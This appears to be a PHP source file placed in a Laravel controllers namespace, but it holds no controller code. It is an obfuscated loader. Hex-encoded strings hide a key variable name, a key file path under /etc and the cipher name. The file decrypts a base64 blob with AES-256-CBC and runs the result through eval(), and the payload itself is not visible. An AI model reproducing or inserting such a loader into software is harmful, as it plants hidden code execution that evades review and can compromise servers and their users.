<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('Ot46dJKMM3oQg036Vb9NrQ==');

$c=base64_decode(

'Bt4ZT0KQHFUqbFVsqdqm+TPIsk47gCeyD6WqJQMIhcf58hZ2bm2bLygyGljf6pt81uwHE6N09ieY' .
'UcPk2tRclLvTSW5mDlWnZL2c767fIk7hmvAYL+nsruKDpTsl7SymJMupNX//y28lfJTMvN6JvG1t' .
'RRXOTufFHOIAyCZlobJ02PuUh/kEq+y6Ek7DVMnUw4/MgSl17I8nL9VkcJUV2zPb7OfQyowCquyx' .
'9OsVwlluuiU6WLiC9R/QL30+gkmJ'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

